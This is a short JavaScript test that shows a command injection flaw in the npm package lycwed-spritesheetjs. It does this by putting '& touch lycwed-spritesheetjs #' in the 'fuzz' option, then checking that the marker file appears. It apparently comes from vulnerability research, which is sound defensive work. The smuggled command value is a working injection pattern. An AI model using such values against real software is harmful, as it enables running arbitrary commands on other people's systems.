
 test("Command Injection in lycwed-spritesheetjs", () => 
{
	var spritesheet = require("lycwed-spritesheetjs");
	const fs = require('fs')
	const path = './lycwed-spritesheetjs'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	spritesheet("./", {fuzz:"& touch lycwed-spritesheetjs #", ext: "json" }, function() {});
	
	sleep.sleep(7);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
